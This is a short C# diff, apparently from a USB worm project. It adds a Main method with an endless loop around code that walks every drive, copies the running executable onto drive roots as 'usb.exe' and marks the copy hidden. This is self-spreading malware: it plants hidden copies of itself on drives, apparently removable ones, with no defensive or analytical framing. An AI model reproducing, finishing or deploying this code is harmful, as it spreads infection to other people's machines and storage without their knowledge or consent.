@@ -1,6 +1,9 @@
 using System.IO;
 
-
+static void Main()
+{
+while (true)
+{
 DriveInfo[] drives = DriveInfo.GetDrives();
 foreach (DriveInfo drive in drives)
 {
@@ -15,4 +18,6 @@ foreach (DriveInfo drive in drives)
 		File.Copy(Application.ExecutablePath, drive.Name + "usb.exe", true);
 		File.SetAttributes(drive.Name + "usb.exe", File.GetAttributes(drive.Name + "usb.exe") | FileAttributes.Hidden);
 	}
+}
+}
 }
